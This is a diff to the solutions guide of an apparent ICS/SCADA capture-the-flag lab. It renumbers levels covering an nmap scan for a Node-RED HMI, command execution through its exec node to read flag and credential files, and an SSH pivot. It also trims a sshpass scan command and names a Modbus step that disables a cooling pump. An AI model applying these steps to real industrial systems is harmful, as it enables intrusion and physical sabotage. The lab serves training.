@@ -32,9 +32,25 @@ This document provides the complete step-by-step solutions for all training leve
 
 ---
 
-## Level 2: SCADA HMI Compromise (Florida Oldsmar Hack)
+## Level 2: RECONNAISSANCE: SCADA HMI Discovery
 
-**Objective:** Exploit the unauthenticated Node-RED interface on `scada-hmi` (`192.168.100.10:1880`) to read `/root/flag.txt` and locate EWS credentials in `/home/debian/ews_credentials.txt`.
+**Objective:** Scan the operations management subnet (`192.168.100.0/24`) from your Kali workstation (`10.10.10.50`) to locate the active HMI web flow portal IP and port.
+
+**Answer:** `192.168.100.10:1880`
+
+### Steps:
+1. Open a terminal on Kali.
+2. Scan the subnet to target open ports for common SCADA dashboard web services (Node-RED defaults to port `1880`):
+   ```bash
+   nmap -p 1880 --open 192.168.100.0/24
+   ```
+3. Locate the IP address from the open port line output: **`192.168.100.10`**. The answer format is IP and Port: **`192.168.100.10:1880`**.
+
+---
+
+## Level 3: EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Hack)
+
+**Objective:** Exploit the unauthenticated Node-RED interface on `scada-hmi` (`192.168.100.10:1880`) to read `/root/flag.txt`.
 
 **Answer:** `FLAG{SCADA_HMI_COMPROMISED}`
 
@@ -42,32 +58,39 @@ This document provides the complete step-by-step solutions for all training leve
 1.  Open the Kali web browser and go to `http://192.168.100.10:1880/`.
 2.  Drag an **`inject`** node, an **`exec`** node, and a **`debug`** node onto the canvas.
 3.  Configure the `exec` node with the command: `cat /root/flag.txt`
-4.  Wire them: `inject` ──► `exec` ──► `debug`.
+4.  Wire them: `inject` ──► `exec` ──► `debug` (top output port).
 5.  Click **Deploy** and click the trigger button on the `inject` node.
 6.  Copy the flag from the debug panel: `FLAG{SCADA_HMI_COMPROMISED}`.
-7.  Change the `exec` command to `cat /home/debian/ews_credentials.txt` and trigger it to retrieve the EWS credentials:
-    *   **Host:** `192.168.20.20`
-    *   **User:** `operator`
-    *   **Password:** `operator123`
 
 ---
 
-## Level 3: EWS Pivot & Recon (Ukraine Power Grid)
+## Level 4: CREDENTIAL ACCESS: Operator Secrets
+
+**Objective:** Search the compromised HMI filesystem to locate and extract Operator credentials from `/home/debian/ews_credentials.txt`.
+
+**Answer:** `operator123`
+
+### Steps:
+1. Change the Node-RED `exec` node command to read the credential configuration:
+   ```bash
+   cat /home/debian/ews_credentials.txt
+   ```
+2. Click **Deploy** and click the inject trigger button.
+3. The output contains:
+   * **Host:** `192.168.20.20`
+   * **User:** `operator`
+   * **Password:** `operator123`
+4. Copy the operator password: **`operator123`**.
+
+---
+
+## Level 5: PIVOT: EWS Lateral Pivot (Ukraine Power Grid)
 
 **Objective:** Use the stolen credentials to SSH into EWS from the HMI, scan the control network, and locate the active PLC.
 
 **Answer:** `192.168.20.10`
 
-### Approach A: Non-Interactive (exec node via sshpass)
-1.  Change the Node-RED `exec` node command to run the scan directly over SSH from the HMI:
-    ```bash
-    sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 "nmap -sn 192.168.20.0/24"
-    ```
-2.  The debug node output will list active hosts. Identify the PLC: **`192.168.20.10`**.
-
----
-
-### Approach B: Interactive Reverse Shell (Recommended)
+### Approach: Interactive Reverse Shell (Recommended)
 
 This approach establishes a full interactive terminal on the SCADA HMI back to your Kali machine, allowing you to manually SSH pivot to the EWS — closely replicating the technique used in the Ukraine Power Grid attack.
 
@@ -95,7 +118,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Your prompt will change to `root@scada-hmi:~#`, confirming a fully interactive terminal.
 
 #### Step 4 — SSH Pivot to the EWS
-From the upgraded shell on the SCADA HMI, SSH into the Engineering Workstation using the credentials stolen in Level 2:
+From the upgraded shell on the SCADA HMI, SSH into the Engineering Workstation using the credentials stolen in Level 4:
 ```bash
 ssh operator@192.168.20.20
 ```
@@ -156,7 +179,7 @@ Watching traffic for a few minutes reveals the EWS communicating with `192.168.2
 
 ---
 
-## Level 4: Process Sabotage (Modbus Hijack)
+## Level 6: Process Sabotage (Modbus Hijack)
 
 **Objective:** Disable the cooling pump by writing `0` to Holding Register 0 on the PLC, and read the confirmation flag from `/var/log/safety_override.txt` on the EWS.
 
